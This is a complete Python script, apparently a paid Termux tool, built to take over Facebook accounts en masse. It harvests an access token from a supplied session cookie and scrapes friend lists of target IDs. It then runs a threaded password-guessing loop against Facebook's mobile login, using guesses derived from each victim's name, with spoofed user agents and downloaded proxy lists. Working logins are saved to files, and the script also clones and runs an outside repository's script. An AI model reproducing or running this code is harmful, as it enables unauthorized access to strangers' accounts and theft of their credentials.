#------------------[ IMPORTING MODULES ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from datetime import date
###----------[ RANDOM STUFFS ]---------- ###
ip = requests.get("https://api.ipify.org").text
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	open('.name.txt','a')
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#00C8FF"
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#------------------[ USER AGENTS ]-------------------#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 
    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.83.1; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
    dua  = f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/130.0.337455237 Mobile/15E148 Safari/604.1"
    tiga  = f"Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
    empat  = f"Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
#------------------[ PROXIES ]-------------------#
try:
	proxylist= requests.get('https://raw.githubusercontent.com/Basari-ID/BMBF/main/socks4.txt').text
	open('socks4.txt','w').write(proxylist)
except Exception as e:
	basari_tamvan(f'{bas}Proxy_List_Basari')
prox=open('socks4.txt','r').read().splitlines()
#------------------[ COLOURS ]-------------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
todaydate = str(tgl)+'-'+str(bln)+'-'+str(thn)
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
###----------[ BANNER ]---------- ###    
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print('\033[1;37m--------------------------------------------------')
def cls():
	os.system('clear')
	banner()
	info()
def info():
	print(f"""\033[1;37m--------------------------------------------------
 GitHub.   : S U G A R D A D D Y 
 CREATOR: PUBLIC CLONING
 VERSION    : 3.1.23
\033[1;37m--------------------------------------------------""")
#------------------[ TIME FITCHER ]-------------------#
from time import localtime as lt
from os import system as cmd
with open('.name.txt') as qu:
	uname = qu.read()
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ LOGO STUFFS ]-------------------#
def banner():
	clear()
	print("""

┌──────────────────────────────────────────────────────────────────────────────────────────────┐

░█████╗░███╗░░░███╗██╗░░░██╗██╗░░░░░
██╔══██╗████╗░████║██║░░░██║██║░░░░░
███████║██╔████╔██║██║░░░██║██║░░░░░
██╔══██║██║╚██╔╝██║██║░░░██║██║░░░░░
██║░░██║██║░╚═╝░██║╚██████╔╝███████╗
╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░╚══════╝
 
└──────────────────────────────────────────────────────────────────────────────────────────────┘  	\33[0;91mv3.1""")
#------------------[  INSTALLING MOUDLES ]-------------------#
def modules():
	os.system('clear')
	banner()
	info()
	print(' [\u001b[36m•\033[1;37m] Modules Are Being Installed ')
	time.sleep(2)
	os.system('termux-setup-storage')
	time.sleep(1)
	os.system('clear')
	banner()
	info()
	os.system('pip install rice')
	time.sleep(1)
	os.system('pip install rich')
	time.sleep(1)
	os.system('pip install requests')
	time.sleep(1)
	os.system('pip install stdiomask')
	time.sleep(1)
	os.system('pip install bs4')
	os.system('clear')
	banner()
	info()
	animation(' [\u001b[36m•\033[1;37m] Congratulations Modules Are Successfully Installed')
	linex()
	os.system('exit')
	time.sleep(2)
os.system('xdg-open https://www.facebook.com/amul.sharma.946179?mibextid=ZbWKwL')
#------------------[ APPROVAL SYSTEM ]-------------------#
def approval():
  os.system('git pull')
  time.sleep(1)
  uuid = str(os.geteuid())+"69"+str(os.geteuid())
  id = "AMUL-"+"".join(uuid)
  os.system('clear')
  banner()
  info()
  animation("\033[1;37m [\u001b[36m•\033[1;37m] This Is Paid Tool You Need Approval To Use This Tool \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m--------------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/SUGAR-DADDY-404/Approval/blob/main/Approved.txt").text
    if id in httpCaht:
      animation(">> Your Key Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      animation(">> Sorry Your Key Has Not Been Approved ");
      time.sleep(0.1)
      input(' >> Click Enter To Send Your Key ')
      os.system('xdg-open https://www.facebook.com/amul.sharma.946179?mibextid=ZbWKwL')
      time.sleep(1)
      exit()
  except: 
     animation(" >> Fucking Error ")
     time.sleep(2)
     exit() 
approval()
#------------------[ COOKIE SYSTEM ]-------------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3) 
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] No Connection Detected')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		info() 
		ses = requests.Session()
		cookie = input(' [•] Input Cookie : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		linex()
		animation(' >> Login Sucess  !!! ')
		exit()
	except Exception as e:
		linex()
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		animation(f'\033[0m >> Your Cookie Has Been Exipred Try Again With A New One')
		exit()
#-----------------[ CRACK-RESULT ]-----------------#
def result():
	print(f'>> 1. YOUR {h}OK{x} RESULT ')
	print(f'>> 2. YOUR {k}CP{x} RESULT ')
	print('>> 3. RETURN	')
	kz = input(f'\n>> SELECT : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File As You Enter Does Not Exits ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> MUZI INCORRECT OPTION CHOOSE NAHAN CORRECT CHOOSE HAN ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> F')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter To Exit {x} ]')
			back()
	if kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			
			print('• File As You Enter Does Not Exits ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('• No OK FiLe Here ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n• CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print('• Choose The Fucking Correct Option ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('• File As You Enter Does Not Exits ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ Click Enter To Exit ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('• Choose The Fucking Correct Option ')
		exit()
#------------------[ MENU PAGE ]-------------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		linex()
		print('\033[0m >> COOKIE EXPIRE BHAXA ARKO HAL ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	info()
	today=date.today()
	print(" [\u001b[36m•\033[1;37m] Today's date  :",todaydate)
	print(" [\u001b[36m•\033[1;37m] Your Ip :",ip)
	linex()
	print(f""" [\u001b[36m1\033[1;37m] Public Clonning [ON]\n [\u001b[36m2\033[1;37m] File clonning[ON]\n [\u001b[36m3\033[1;37m] Create File  [ON]\n [\u001b[36m4\033[1;37m] Check Results \n [\u001b[36m0\033[1;37m] Logout Menu""")
	linex()
	Meledak = input(' Choose : ')
	if Meledak in ['1']:
		dump_massal()
	elif Meledak in ['2']:
		crack_file() 
	elif Meledak in ['3']:
		os.system('clear')
		banner()
		info()
		os.system('git clone https://github.com/harryyy-xd/Dump')
		linex()
		animation(' >> Opening File Maker ')
		time.sleep(1)
		os.system('cd Dump && python dump.py')
	elif Meledak in ['4']:
		result()
	elif Meledak in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		linex()
		animation(' [×] Logout Sucess And Deleted Cookies That You Entered ')  
		exit()
	else:
		linex()
		animation(' >> The Option You Choosed Is Invalid ')
		back()
def error():
	print(f'╰─ Sorry, this feature Is Not Ready Yet Trying To Fix It Soon {x}')
	time.sleep(4)
	back()
#------------------[ PUBLIC CRACKING ]-------------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		info()
		jum = int(input(' [\u001b[36m•\033[1;37m] Enter The Number Of Idz You Want To Clone : '))
	except ValueError:
		linex()
		animation( ' >> Only Letters Are Accepted ')
		back()
	if jum<1 or jum>100:
		linex()
		animation(' >> Id Is Not Not Public ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		linex()
		kl = input(' [\u001b[36m•\033[1;37m] Enter Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] Connection Lost ')
			exit()
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] Total Idz \u001b[36m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		linex()
		animation(' [×] Connection Lost ')
		back()
	except (KeyError,IOError):
		animation(f' [×] Friendlist Is Not Public {x}')
		time.sleep(3)
		back()
#------------------[ FILE CRACKING ]-------------------#
def crack_file():
	os.system('clear')
	banner()
	info()
	print(' [\u001b[36m•\033[1;37m] Input File Name Without /sdcard ')
	linex()
	o1 = input(' [\u001b[36m•\033[1;37m] Enter The Name Of File : ')
	o = '/sdcard/'+o1
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] File As You Enter Does Not Exits ')
		time.sleep(2)
		back()
#------------------[ SETTTINGS ]-------------------#
	for xid in lin:
		id.append(xid)
	setting()

def setting():
	linex()
	print(''' [\u001b[36m1\033[1;37m] Crack Old IDz \n [\u001b[36m2\033[1;37m] Crack New IDz \n [\u001b[36m3\033[1;37m] Crack Mix IDz''')
	linex()
	hu = input(' [\u001b[36m•\033[1;37m] Choose : ')
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		linex()
		animation(' >> Choose The Fucking Correct Option ')
		back()
#------------------[ LOGIN METHOD ]-------------------#
	linex()
	print(''' [\u001b[36m•\033[1;37m] Method 1 (Best)\n [\u001b[36m•\033[1;37m] Method 2 \n [\u001b[36m•\033[1;37m] Method 3''')
	linex()
	hc = input(' [\u001b[36m•\033[1;37m] Enter : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mobile')
	elif hc in ['3','03']:
		method.append('mobile')
	else:
		method.append('mobile')
#	su() 
	passu()
#------------------[  PASSWORD LIST CHECKER ]-------------------#
#def su():
	cls()
#	prints(nel(f"\t{P2}[{H2}1{P2}].   321 + 123 + 12345 [ {K2}Kurang Efektif {P2}]\n\t[{H2}2{P2}].   123 + 12345 + 123456 [ {M2}Kurang Meyakinkan {P2}]\n\t[{H2}3{P2}].   123 + 1234 + 12345 [{H2} Disarankan Ini {P2}]\n\t[{H2}4{P2}].   123 + 12345 [{H2} Disarankan Ini {P2}]",width=80,style=f"{color_panel}")) 
#	ch = input('[•] Pilih  : ')
#	if ch in ['1','01']:
#		babi()
#	elif ch in ['2','02']:
#		sulap()
#	elif ch in ['3','03']:
#		passu()
#	elif ch in ['4','04']:
#		mie()
#	else:
#	passu()
#------------------[ PASSWORD LIST  ]-------------------#
def passu():
	global prog,des
	linex()
	cls()
	print(f' [\u001b[36m•\033[1;37m] Total IDz : \u001b[36m',str(len(id)))
	print(" [\u001b[36m•\033[1;37m] You Started Cloning At : "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	linex()
	prints(f' >> HOLD AS YOU CAN ')
	linex()
	prog = Progress(TextColumn(' [AMUL-XD]{task.description}'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
				            pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
					pwv.append(frs+'1111')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@098')
					
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
					        pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
					pwv.append(frs+'1111')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@098')
					
					
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crack,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		linex()
	linex()
	print(' [\u001b[36m•\033[1;37m] Cloning Complete ')
	print(' [\u001b[36m•\033[1;37m] OK : %s '%(ok))
	print(' [\u001b[36m•\033[1;37m] CP : %s '%(cp))
	
	linex()
	woi = input(' >> Enter To Exit')
	back()
	time.sleep(2)
	exit()
#------------------[ METHOD ]-------------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [{time.strftime("%H:%M")}-CP] {idf} │ {pw} \033[1;97m')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}[AMUL-OK] {idf}  {pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
#------------------[ MAIN  ]-------------------#
if __name__=='__main__':
	try:open('.name.txt','a')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login() 